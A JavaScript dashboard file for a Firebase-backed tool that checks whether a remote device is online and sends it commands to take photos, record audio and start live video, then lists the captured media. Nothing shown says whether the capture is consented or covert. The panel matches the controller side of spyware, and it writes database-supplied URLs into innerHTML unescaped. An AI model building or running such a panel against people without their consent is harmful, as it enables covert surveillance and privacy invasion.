import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
import { getDatabase, ref, onValue, set, push, remove, onChildAdded } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyA8eOfD00aoJIZtnjwoJyKvEAQB5VNblBY",
    authDomain: "tanvi-app-c09da.firebaseapp.com",
    databaseURL: "https://tanvi-app-c09da-default-rtdb.firebaseio.com",
    projectId: "tanvi-app-c09da",
    storageBucket: "tanvi-app-c09da.firebasestorage.app",
    messagingSenderId: "338834659328",
    appId: "1:338834659328:web:50bfd1f7612e69b80560e5"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// DOM Elements
const statusBadge = document.getElementById('status-badge');
const lastSeenEl = document.getElementById('last-seen');
const captureBtn = document.getElementById('capture-btn');
const recordStartBtn = document.getElementById('record-start-btn');
const recordStopBtn = document.getElementById('record-stop-btn');
const liveStartBtn = document.getElementById('live-start-btn');
const liveStopBtn = document.getElementById('live-stop-btn');
const liveFrame = document.getElementById('live-frame');
const livePlaceholder = document.getElementById('live-placeholder');
const liveIndicator = document.getElementById('live-indicator');
const imageList = document.getElementById('image-list');
const audioList = document.getElementById('audio-list');
const tabBtns = document.querySelectorAll('.tab-btn');
const tabPanels = document.querySelectorAll('.tab-panel');

// Status Monitoring
onValue(ref(db, 'status'), (snapshot) => {
    const status = snapshot.val();
    if (status) {
        const isOnline = status.active && (Date.now() - status.lastSeen < 60000);
        statusBadge.className = `badge ${isOnline ? 'online' : 'offline'}`;
        statusBadge.textContent = isOnline ? 'Online' : 'Offline';
        lastSeenEl.textContent = new Date(status.lastSeen).toLocaleString();
    }
});

// Live Stream Monitor
onValue(ref(db, 'live'), (snapshot) => {
    const data = snapshot.val();
    if (data && data.url) {
        liveFrame.src = data.url;
        liveFrame.style.display = 'block';
        livePlaceholder.style.display = 'none';
        liveIndicator.style.display = 'block';
    } else {
        liveFrame.style.display = 'none';
        livePlaceholder.style.display = 'block';
        liveIndicator.style.display = 'none';
    }
});

// Commands
captureBtn.addEventListener('click', () => {
    set(ref(db, 'commands'), { type: 'CAPTURE_IMAGE', timestamp: Date.now() });
});

recordStartBtn.addEventListener('click', () => {
    set(ref(db, 'commands'), { type: 'START_AUDIO', timestamp: Date.now() });
    recordStartBtn.disabled = true;
    recordStopBtn.disabled = false;
});

recordStopBtn.addEventListener('click', () => {
    set(ref(db, 'commands'), { type: 'STOP_AUDIO', timestamp: Date.now() });
    recordStartBtn.disabled = false;
    recordStopBtn.disabled = true;
});

liveStartBtn.addEventListener('click', () => {
    set(ref(db, 'commands'), { type: 'START_LIVE', timestamp: Date.now() });
    liveStartBtn.disabled = true;
    liveStopBtn.disabled = false;
});

liveStopBtn.addEventListener('click', () => {
    set(ref(db, 'commands'), { type: 'STOP_LIVE', timestamp: Date.now() });
    liveStartBtn.disabled = false;
    liveStopBtn.disabled = true;
});

// Media Listeners
onChildAdded(ref(db, 'data/images'), (snapshot) => {
    const data = snapshot.val();
    const placeholder = imageList.querySelector('.placeholder');
    if (placeholder) placeholder.remove();

    const item = document.createElement('div');
    item.className = 'media-item';
    item.innerHTML = `
        <img src="${data.url}" alt="Snapshot">
        <div class="media-info">${new Date(data.timestamp).toLocaleString()}</div>
    `;
    imageList.prepend(item);
});

onChildAdded(ref(db, 'data/audio'), (snapshot) => {
    const data = snapshot.val();
    const placeholder = audioList.querySelector('.placeholder');
    if (placeholder) placeholder.remove();

    const item = document.createElement('div');
    item.className = 'audio-item';
    item.innerHTML = `
        <div class="audio-info">${new Date(data.timestamp).toLocaleString()}</div>
        <audio controls src="${data.url}"></audio>
    `;
    audioList.prepend(item);
});

// Tab Logic
tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.getAttribute('data-tab');
        tabBtns.forEach(b => b.classList.remove('active'));
        tabPanels.forEach(p => p.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(`${tab}-panel`).classList.add('active');
    });
});
